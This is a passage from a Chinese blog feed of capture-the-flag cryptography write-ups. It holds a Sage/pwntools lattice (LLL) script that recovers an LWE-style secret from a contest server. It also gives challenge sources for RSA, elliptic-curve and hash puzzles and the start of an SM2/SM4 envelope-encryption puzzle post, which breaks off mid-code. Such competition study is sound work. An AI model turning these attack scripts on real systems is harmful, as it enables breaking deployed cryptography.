class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>如果</mtext><msub><mi>k</mi><mi>i</mi></msub><mo>=</mo><mo>−</mo><msub><mi>K</mi><mi>i</mi></msub><mtext>，中间就是</mtext><mo>−</mo><msub><mi>e</mi><mi>i</mi></msub><mtext>了，很小的一个分量，这样就完美地得到短向量</mtext><mi>v</mi></mrow><annotation encoding="application/x-tex">如果k_{i}=-K_{i}，中间就是-e_{i}了，很小的一个分量，这样就完美地得到短向量v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord">−</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">间</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">很</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">样</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">完</span><span class="mord cjk_fallback">美</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">短</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 1: Replicate the problem&#x27;s parameters and matrix &#x27;A&#x27; generation.</span></span><br><span class="line"><span class="comment"># The random seed is fixed, so &#x27;A&#x27; will be the same every time.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">p, n, m = <span class="number">257</span>, <span class="number">36</span>, <span class="number">50</span></span><br><span class="line"><span class="comment"># import random</span></span><br><span class="line"><span class="comment"># random.seed(int(1337))</span></span><br><span class="line"><span class="comment"># A = [[[random.randrange(p) for _ in range(2)] for _ in range(n)] for _ in range(m)]</span></span><br><span class="line">A = []</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 2: Connect to the server and receive the public vector &#x27;B&#x27;.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">conn = remote(<span class="string">&#x27;node8.anna.nssctf.cn&#x27;</span>, <span class="number">22485</span>)</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;give you B: &#x27;</span>)</span><br><span class="line">B_str = conn.recvline().strip().decode()</span><br><span class="line">B = <span class="built_in">eval</span>(B_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Received B vector of length <span class="subst">&#123;<span class="built_in">len</span>(B)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 3: Formulate the LWE problem by calculating A&#x27; and b&#x27;.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">A_prime = Matrix(GF(p), m, n)</span><br><span class="line">b_prime = vector(GF(p), m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    sum_A0 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        A_prime[i, j] = A[i][j][<span class="number">1</span>] - A[i][j][<span class="number">0</span>]</span><br><span class="line">        sum_A0 += A[i][j][<span class="number">0</span>]</span><br><span class="line">    b_prime[i] = B[i] - sum_A0</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] LWE system constructed successfully.&quot;</span>)</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 4: Construct the lattice basis matrix for LLL.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">dim = n + m + <span class="number">1</span></span><br><span class="line">L = Matrix(ZZ, dim, dim)</span><br><span class="line">L.set_block(<span class="number">0</span>, <span class="number">0</span>, Matrix.identity(n))</span><br><span class="line">L.set_block(n, n, Matrix.identity(m) * p)</span><br><span class="line">L.set_block(<span class="number">0</span>, n, A_prime.transpose())</span><br><span class="line"><span class="comment"># -- MODIFICATION IS HERE --</span></span><br><span class="line"><span class="comment"># The original set_block failed because b_prime is a vector.</span></span><br><span class="line"><span class="comment"># We replace it with direct row slicing and assignment.</span></span><br><span class="line">L[dim - <span class="number">1</span>, n:n+m] = -b_prime.lift() <span class="comment"># 有限域到整数域的转换</span></span><br><span class="line">L[dim - <span class="number">1</span>, dim - <span class="number">1</span>] = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Lattice basis matrix of shape <span class="subst">&#123;L.dimensions()&#125;</span> constructed.&quot;</span>)</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 5: Run the LLL algorithm.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Running LLL algorithm... This might take a moment.&quot;</span>)</span><br><span class="line">L_reduced = L.LLL()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] LLL algorithm completed.&quot;</span>)</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 6: Extract the secret bits from the shortest vector.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">solution_vector = L_reduced[<span class="number">0</span>]</span><br><span class="line">secret_bits = []</span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">abs</span>(solution_vector[n + m]) == <span class="number">1</span>:</span><br><span class="line">    sign = <span class="built_in">int</span>(solution_vector[n + m])</span><br><span class="line">    s_bits_raw = solution_vector[:n] * sign</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(bit <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">1</span>) <span class="keyword">for</span> bit <span class="keyword">in</span> s_bits_raw):</span><br><span class="line">        secret_bits = [<span class="built_in">int</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> s_bits_raw]</span><br><span class="line">        found = <span class="literal">True</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Valid secret bits found in the first vector of the reduced basis!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Could not find a valid solution vector.&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 7: Reconstruct and send the secret.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">secret = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">if</span> secret_bits[i] == <span class="number">1</span>:</span><br><span class="line">        secret += (<span class="number">1</span> &lt;&lt; i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Reconstructed secret: <span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(secret).encode())</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 8: Receive the flag.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">flag = conn.recvall(timeout=<span class="number">2</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[FLAG] <span class="subst">&#123;flag.strip()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><h2 id="iqqt"><a class="markdownIt-Anchor" href="#iqqt"></a> IqqT*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">    q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">    <span class="keyword">if</span> (GCD(p-<span class="number">1</span>,q-<span class="number">1</span>)) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">Dbits = <span class="number">440</span></span><br><span class="line">N = p*q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d1 = getPrime(Dbits)</span><br><span class="line">d2 = getPrime(Dbits)</span><br><span class="line">e1 = <span class="built_in">pow</span>(d1, -<span class="number">1</span>,phi)</span><br><span class="line">e2 = <span class="built_in">pow</span>(d2, -<span class="number">1</span>,phi)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e1,N)</span><br><span class="line">c = <span class="built_in">pow</span>(c,e2,N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1 = <span class="subst">&#123;e1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e2 = <span class="subst">&#123;e2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 153098639535230461427067981471925418840838598338005180035334795636906122233147195601425250354397215037964687813767036136951747775082105669481477681815877751367786247871862319200300034505895599830252899234816623479894529037827470533297869568936005422622937802442126007732338221711447957108942595934348420152967</span></span><br><span class="line"><span class="comment"># e1 = 26675174225063019792412591801113799130868333007861486357720578798352030914999710926292644671603600643369845213171396954004158372043593223603274138224817810197939227716991483870437629436082594926630937775718564690554680519001757082557490487364436474044434348412437933432480883175650430050712391958500932343901</span></span><br><span class="line"><span class="comment"># e2 = 43950877784211432364704383093702059665468498126670135130662770287054349774316943441695986309047768423965591753129960761705976613430837039441242214744782506036708881166308335886272786409715558332802625980679432726451306523481798238346507261619084743433957076290727858148266709423500224748925763767341340730807</span></span><br><span class="line"><span class="comment"># c = 93877717323267388927595086106164695425439307573037159369718380924127343418544815509333679743420188507149532789861080535086578879105173477672709484480809535461054572173818555600022970592546859742598747214025487041690467952494343056536435494716815059600034890617984024099540213482984895312025775728869974483561</span></span><br></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>≡</mo><msup><mi>m</mi><mrow><mi>e</mi><mn>1</mn><mo>⋅</mo><mi>e</mi><mn>2</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c\equiv m^{e1\cdot e2}\pmod N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">1</span><span class="mbin mtight">⋅</span><span class="mord mathnormal mtight">e</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></span></p><h2 id="hiddenoracle"><a class="markdownIt-Anchor" href="#hiddenoracle"></a> HiddenOracle*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> treasure <span class="keyword">import</span> FLAG, p, a, b</span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(p), [a,b])</span><br><span class="line">A = [randint(<span class="number">0</span>,p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line">B = <span class="built_in">sorted</span>([randint(<span class="number">0</span>,p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)])</span><br><span class="line">oracle = <span class="keyword">lambda</span> x: <span class="built_in">sum</span>([a*<span class="built_in">pow</span>(<span class="built_in">int</span>(x),b,p) <span class="keyword">for</span> a,b <span class="keyword">in</span> <span class="built_in">zip</span>(A,B)])*E.lift_x(<span class="number">0x1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>, oracle(<span class="built_in">input</span>(<span class="string">&quot;[?] &quot;</span>)).xy())</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;[*]&quot;</span>)) == A[<span class="number">0</span>]: <span class="built_in">print</span>(FLAG)</span><br></pre></td></tr></table></figure><h2 id="leetspe4k"><a class="markdownIt-Anchor" href="#leetspe4k"></a> LeetSpe4k*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">le4t = <span class="keyword">lambda</span> x: <span class="string">&quot;&quot;</span>.join(choice(<span class="built_in">next</span>((j <span class="keyword">for</span> j <span class="keyword">in</span> [<span class="string">&#x27;a@4A&#x27;</span>, <span class="string">&#x27;b8B&#x27;</span>, <span class="string">&#x27;cC&#x27;</span>, <span class="string">&#x27;dD&#x27;</span>, <span class="string">&#x27;e3E&#x27;</span>, <span class="string">&#x27;fF&#x27;</span>, <span class="string">&#x27;g9G&#x27;</span>, <span class="string">&#x27;hH&#x27;</span>, <span class="string">&#x27;iI&#x27;</span>, <span class="string">&#x27;jJ&#x27;</span>, <span class="string">&#x27;kK&#x27;</span>, <span class="string">&#x27;l1L&#x27;</span>, <span class="string">&#x27;mM&#x27;</span>, <span class="string">&#x27;nN&#x27;</span>, <span class="string">&#x27;o0O&#x27;</span>, <span class="string">&#x27;pP&#x27;</span>, <span class="string">&#x27;qQ&#x27;</span>, <span class="string">&#x27;rR&#x27;</span>, <span class="string">&#x27;s$5S&#x27;</span>, <span class="string">&#x27;t7T&#x27;</span>, <span class="string">&#x27;uU&#x27;</span>, <span class="string">&#x27;vV&#x27;</span>, <span class="string">&#x27;wW&#x27;</span>, <span class="string">&#x27;xX&#x27;</span>, <span class="string">&#x27;yY&#x27;</span>, <span class="string">&#x27;z2Z&#x27;</span>] <span class="keyword">if</span> i <span class="keyword">in</span> j), i)) <span class="keyword">for</span> i <span class="keyword">in</span> x.decode())</span><br><span class="line">h4sH = <span class="keyword">lambda</span> x: reduce(<span class="keyword">lambda</span> acc, i: ((acc * (<span class="number">2</span>**<span class="number">255</span>+<span class="number">95</span>)) % <span class="number">2</span>**<span class="number">256</span>) + i, x, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(le4t(flag), h4sH(flag))</span><br><span class="line"><span class="comment">#nSsCtf&#123;H@pPy_A7h_4nNiv3R$arY_ns$C7F_@nD_l3t$_d0_7h3_LllE3t$pEAk!&#125; 9114319649335272435156391225321827082199770146054215376559826851511551461403</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://pic1.zhimg.com/80/v2-831f9285e57fba50f2eb1a6dc8c2b4eb_1440w.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
哦豁，这场化身&lt;strong&gt;AI大师&lt;/strong&gt;，周末上大分&lt;/p&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>熵密杯2025-重庆</title>
    <link href="https://hvang10.github.io/2025/07/23/%E7%86%B5%E5%AF%86%E6%9D%AF2025-%E9%87%8D%E5%BA%86/"/>
    <id>https://hvang10.github.io/2025/07/23/%E7%86%B5%E5%AF%86%E6%9D%AF2025-%E9%87%8D%E5%BA%86/</id>
    <published>2025-07-23T01:42:30.000Z</published>
    <updated>2025-07-23T02:34:12.735Z</updated>
    
    <content type="html"><![CDATA[<p>很好，属于是来<strong>重庆旅</strong>游来了，先爆一下战绩，初始谜题做了一个，差点爆零(bushi)</p><p>去年还能做两个初始谜题，后面的夺旗闯关还能有点思路，就是不会写而已</p><p>今年的夺旗闯关就真不会了，看得懂一点，但具体不知道要干嘛，<strong>证书 sm4 sm2</strong> 什么的不会啊</p><p><strong>Rank: 90+/205</strong>，去年好像也是90多，但今年参赛队伍多了不少，难度也难了不少，都没人AK了()，去年四五支队伍AK，我那一列就两三个……</p><p><img src="https://picx.zhimg.com/80/v2-e27b748bcf186cc8475d699cc535386a_1440w.png" alt="" /></p><h2 id="初始谜题1"><a class="markdownIt-Anchor" href="#初始谜题1"></a> 初始谜题1*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sm4_encrypt.py</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der.decoder <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">from</span> pyasn1.<span class="built_in">type</span> <span class="keyword">import</span> univ, namedtype</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3, func, sm2</span><br><span class="line"><span class="keyword">from</span> pyasn1.codec.der.encoder <span class="keyword">import</span> encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2Cipher</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;xCoordinate&#x27;</span>, univ.Integer()), <span class="comment"># -- x 分量</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;yCoordinate&#x27;</span>, univ.Integer()),             <span class="comment"># -- y 分量</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;hash&#x27;</span>, univ.OctetString()),                <span class="comment"># --哈希值</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;cipherText&#x27;</span>, univ.OctetString())           <span class="comment"># -- SM4密钥密文</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EncryptedData</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;algorithm&#x27;</span>, univ.ObjectIdentifier(<span class="string">&#x27;1.2.156.10197.1.104.2&#x27;</span>)), <span class="comment"># -- SM4-CBC OID</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;iv&#x27;</span>, univ.OctetString()),                                                <span class="comment"># -- SM4-CBC加密使用的初始化向量（IV）</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;cipherText&#x27;</span>, univ.OctetString())                                         <span class="comment"># -- SM4加密的密文</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EnvelopedData</span>(univ.<span class="type">Sequence</span>):</span><br><span class="line">    componentType = namedtype.NamedTypes(</span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;encryptedKey&#x27;</span>, SM2Cipher()),                           <span class="comment"># -- 使用SM2公钥加密SM4密钥的密文</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;encryptedData&#x27;</span>, EncryptedData()),                                  <span class="comment">#  -- 使用SM4密钥对明文加密的密文</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;digestAlgorithm&#x27;</span>, univ.ObjectIdentifier(<span class="string">&#x27;1.2.156.10197.1.401.1&#x27;</span>)), <span class="comment"># -- SM3算法OID</span></span><br><span class="line">        namedtype.NamedType(<span class="string">&#x27;digest&#x27;</span>, univ.OctetString())                                       <span class="comment"># -- 对明文计算的摘要值</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_cbc_encrypt</span>(<span class="params">plaintext: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span>, iv: <span class="built_in">bytes</span></span>):</span><br><span class="line">    backend = default_backend()</span><br><span class="line">    cipher = Cipher(algorithms.SM4(key), modes.CBC(iv), backend=backend) <span class="comment">#填充模式 nopadding</span></span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ciphertext = encryptor.update(plaintext) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm2_encrypt</span>(<span class="params">plaintext: <span class="built_in">bytes</span>,public_key:<span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    sm2_crypt = sm2.CryptSM2(private_key=<span class="string">&quot;&quot;</span>,public_key=public_key.<span class="built_in">hex</span>())</span><br><span class="line">    ciphertext = sm2_crypt.encrypt(plaintext)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm3_hash</span>(<span class="params">text:<span class="built_in">bytes</span></span>):</span><br><span class="line">    hash_value = sm3.sm3_hash(func.bytes_to_list(text))</span><br><span class="line">    <span class="keyword">return</span> hash_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_key_from_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            key = file.read().strip()</span><br><span class="line">            <span class="keyword">return</span> key</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 文件 <span class="subst">&#123;file_path&#125;</span> 未找到。&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误: 发生了未知错误 <span class="subst">&#123;e&#125;</span>。&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对由abcd组成的字符串加密的方法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_encrypt</span>(<span class="params">plaintext:<span class="built_in">str</span>,sm2_public_key: <span class="built_in">str</span>,sm4_iv:<span class="built_in">str</span></span>):</span><br><span class="line">    sm4_key = <span class="built_in">bytes</span>.fromhex(read_key_from_file(<span class="string">&quot;key.txt&quot;</span>)) <span class="comment">#从文件读取固定的key</span></span><br><span class="line">    <span class="comment"># sm4</span></span><br><span class="line">    envelope = EnvelopedData()</span><br><span class="line">    plaintext_bytes = plaintext.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    ciphertext = sm4_cbc_encrypt(plaintext_bytes,sm4_key,<span class="built_in">bytes</span>.fromhex(sm4_iv))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm2</span></span><br><span class="line">    encrypted_key = sm2_encrypt(sm4_key,<span class="built_in">bytes</span>.fromhex(sm2_public_key))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sm3</span></span><br><span class="line">    digest = sm3_hash(plaintext_bytes)</span><br><span class="line"></span><br><span class="line">    envelope[<span class="string">&#x27;encryptedData&#x27;</span>] = EncryptedData()</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;iv&#x27;</span>] = univ.OctetString(<span class="built_in">bytes</span>.fromhex(sm4_iv))</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedData&#x27;</span>][<span class="string">&#x27;cipherText&#x27;</span>] = univ.OctetString(ciphertext)</span><br><span class="line"></span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>] = SM2Cipher()</span><br><span class="line">    envelope[<span class="string">&#x27;encryptedKey&#x27;</span>][<span class="string">&#x27;xCoordinate&#x27;</span>] = 